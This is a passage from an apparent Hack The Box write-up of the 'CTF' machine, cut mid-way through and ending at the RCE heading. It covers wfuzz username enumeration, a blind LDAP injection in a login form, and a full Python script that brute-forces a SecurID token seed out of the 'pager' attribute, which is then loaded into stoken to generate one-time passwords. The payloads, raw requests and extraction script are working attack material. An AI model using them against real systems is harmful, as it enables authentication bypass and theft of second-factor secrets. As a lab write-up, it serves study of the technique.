000021:  C=200     68 L      233 W         2835 Ch        &quot;0123456789&quot;
000015:  C=200     68 L      233 W         2833 Ch        &quot;00000000&quot;
000016:  C=200     68 L      233 W         2827 Ch        &quot;01&quot;
^C
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;all-user-not-found-responses-have-233-words-so-i-filtered-them-&quot;&gt;All “user not found” responses have 233 words so I filtered them :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c --hw 233 -u http://ctf.htb/login.php -X POST -d &quot;inputUsername=FUZZ&amp;amp;inputOTP=0000&quot; -w ./multiplesources-users-fabian-fingerle.de.txt                                  

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000006:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*&quot;
000003:  C=200     68 L      229 W         2810 Ch        &quot;!@#%&quot;
000004:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;
000005:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;&quot;
000007:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*(&quot;
000008:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*()&quot;
000002:  C=200     68 L      229 W         2810 Ch        &quot;!@#&quot;
000010:  C=200     68 L      229 W         2810 Ch        &quot;*****&quot;
000065:  C=200     68 L      229 W         2810 Ch        &quot;123456*a&quot;
005121:  C=200     68 L      229 W         2810 Ch        &quot;Ch4ng3m3!&quot;
005723:  C=200     68 L      229 W         2810 Ch        &quot;*%Cookie:&quot;
009377:  C=200     68 L      229 W         2810 Ch        &quot;!!Huawei&quot;
011497:  C=200     68 L      231 W         2822 Ch        &quot;ldapuser&quot;
011866:  C=200     68 L      234 W         2835 Ch        &quot;lost+found&quot;
012611:  C=200     68 L      233 W         2831 Ch        &quot;maurta&quot;^C
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-worked-and-i-didnt-get-banned-after-some-time-i-got-a-result-which-was-ldapuser-thats-weird-i-also-noticed-that-payloads-that-had-special-characters-in-them-caused-different-response-length-i-tried-ldapuser-to-see-whats-the-other-message-&quot;&gt;It worked and I didn’t get banned, after some time I got a result which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt;, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; to see what’s the other message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ctf/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-cannot-login&quot;&gt;It was “Cannot login”&lt;/h4&gt;
&lt;h4 id=&quot;then-i-tried--and-i-got-nothing-i-just-got-the-login-page-back-again-without-any-messages-i-figured-out-that-the-username-is-being-used-in-an-ldap-query-and-its-injectable-because-of-the-special-chars-payloads-also-that-existing-attribute-where-the-token-is-stored-is-an-ldap-attribute-with-the-injection-we-have-we-can-extract-the-token-and-use-it-to-generate-valid-otps-but-because-the-injection-is-blind-it-will-be-kinda-tricky-to-extract-the-token&quot;&gt;Then I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;!@#%^&amp;amp;*&lt;/code&gt; and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; attribute. With the injection we have we can extract the token and use it to generate valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s. But because the injection is blind it will be kinda tricky to extract the token.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ldap-injection&quot;&gt;LDAP Injection&lt;/h3&gt;
&lt;h4 id=&quot;as-i-said-its-a-blind-injection-which-means-that-we-wont-get-any-results-but-a-payload-like-this-uiduid--should-result-in-cannot-login-however-when-i-tried-it-i-didnt-get-any-message-so-i-tried-to-url-encode-the-payload-and-it-worked-so-the-injection-works-when-the-payload-is-double-url-encoded-i-only-encoded-the-payload-once-because-the-browser-automatically-encodes-post-data-i-switched-to-burp-here-are-the-results-&quot;&gt;As I said, it’s a blind injection which means that we won’t get any results. But a payload like this :&lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(uid=*&lt;/code&gt;  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /login.php HTTP/1.1
Host: ctf.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Cookie: PHPSESSID=sqmpanb3d1uui0pf4uafubv010
Connection: close
Upgrade-Insecure-Requests: 1

inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;amp;inputOTP=0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 17:58:29 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 2822
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	---------
	 Removed
	---------
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    Cannot login    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
	---------
	 Removed
	---------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-need-to-know-which-attribute-the-token-is-stored-in-we-know-its-an-existing-attribute-so-we-just-need-to-choose-the-right-one-i-checked-ldap-attributes-and-chose-some-of-them-to-test-comment-pager-and-info-the-payload-will-be-like-this--uidattribute-instead-of-the-second-uid-attribute-we-will-use-the-attribute-we-are-testing-we-also-know-that-the-token-is-numeric-so-we-can-remove--and-replace-it-with-numeric-values-from-0-to-9-and-monitor-the-responses-i-used-burp-intruder-to-do-this-so-the-final-payload-will-be-like-this--uidattributen-after-some-testing-this-payload-with-the-attribute-pager-and-value-of-2--uidpager2-resulted-in-cannot-login-message-great-so-our-payload-will-be-uidpager2n-and-we-will-bruteforce-the-second-number-again-until-we-get-cannot-login-we-will-keep-repeating-this-until-we-reach-the-81st-number-but-doing-this-manually-is-lame-and-boring-so-i-wrote-a-python-script&quot;&gt;Now we need to know which attribute the token is stored in. We know it’s an existing attribute so we just need to choose the right one. I checked &lt;a href=&quot;https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; attributes&lt;/a&gt; and chose some of them to test (&lt;code class=&quot;highlighter-rouge&quot;&gt;comment&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pager&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt;), the payload will be like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(ATTRIBUTE=*&lt;/code&gt; (instead of the second &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(ATTRIBUTE=N&lt;/code&gt;. After some testing this payload with the attribute &lt;code class=&quot;highlighter-rouge&quot;&gt;pager&lt;/code&gt; and value of 2 : &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(pager=2&lt;/code&gt; resulted in “Cannot login” message. Great so our payload will be &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(pager=2N&lt;/code&gt; and we will bruteforce the second number again until we get “Cannot login”. We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploitation-token-extraction&quot;&gt;Exploitation, Token Extraction&lt;/h3&gt;
&lt;h4 id=&quot;i-created-3-functions-&quot;&gt;I created 3 functions :&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;send_payload--to-send-the-injection-payload-and-receive-the-response&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send_payload&lt;/code&gt;  (to send the injection payload and receive the response)&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;check_response-to-check-whether-the-response-contains-cannot-login-or-not&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt; (to check whether the response contains “Cannot login” or not)&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h4 id=&quot;exploit--this-function-creates-a-list-of-numbers-from-0-to-9-then-by-looping-through-that-list-it-creates-the-payload-which-is--2a2928uid3d2a2929287c28pager3d--token--number--2a-encoded-only-once-because-python-requests-automatically-encodes-post-data-then-it-calls-send_payload-and-check_response-if-check_response-returned-true-it-adds-the-valid-number-to-the-token&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt; : This function creates a list of numbers from 0 to 9, then by looping through that list it creates the payload which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D&lt;/code&gt; + token + number + &lt;code class=&quot;highlighter-rouge&quot;&gt;%2A&lt;/code&gt; (encoded only once because python requests automatically encodes POST data). Then it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;send_payload&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt;, if &lt;code class=&quot;highlighter-rouge&quot;&gt;check_response&lt;/code&gt; returned &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; it adds the valid number to the token.&lt;/h4&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;then-i-wrote-a-while-loop-to-keep-calling-exploit-as-long-as-lentoken-is-not-81&quot;&gt;Then I wrote a &lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt; loop to keep calling &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit()&lt;/code&gt; as long as &lt;code class=&quot;highlighter-rouge&quot;&gt;len(token)&lt;/code&gt; is not 81&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;extract_tokenpy-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;extract_token.py&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0000&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.122/login.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Cannot login&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;n_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%29%28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%29%29%28%7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pager&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;D{}{}&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Extracting Token&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Status : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Done !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Token : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ctf/8.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-took-some-minutes-to-finish-and-now-we-have-the-token-&quot;&gt;It took some minutes to finish and now we have the token :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;285449490011357156531651545652335570713167411445727140604172141456711102716717000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-installed-stoken-apt-get-install-stoken-then-i-imported-the-token-&quot;&gt;I installed &lt;a href=&quot;https://github.com/cernekee/stoken&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt;&lt;/a&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install stoken&lt;/code&gt;), Then I imported the token :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-didnt-type-any-password-i-left-it-blank-we-can-either-use-the-cli-or-the-gui-for-the-cli-you-have-to-start-stoken-and-enter-the-pin-then-you-will-get-the-otp-and-for-another-otp-youll-need-to-start-stoken-again&quot;&gt;I didn’t type any password I left it blank. We can either use the &lt;code class=&quot;highlighter-rouge&quot;&gt;cli&lt;/code&gt; or the &lt;code class=&quot;highlighter-rouge&quot;&gt;gui&lt;/code&gt;, for the &lt;code class=&quot;highlighter-rouge&quot;&gt;cli&lt;/code&gt; you have to start &lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt; and enter the pin then you will get the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;, and for another &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; you’ll need to start &lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt; again.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-just-used-the-gui-as-its-better-&quot;&gt;So I just used the &lt;code class=&quot;highlighter-rouge&quot;&gt;gui&lt;/code&gt; as it’s better :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-user-flag&quot;&gt;RCE, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;lets-login-and-see-whats-there-&quot;&gt;Let’s login and see what’s there :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
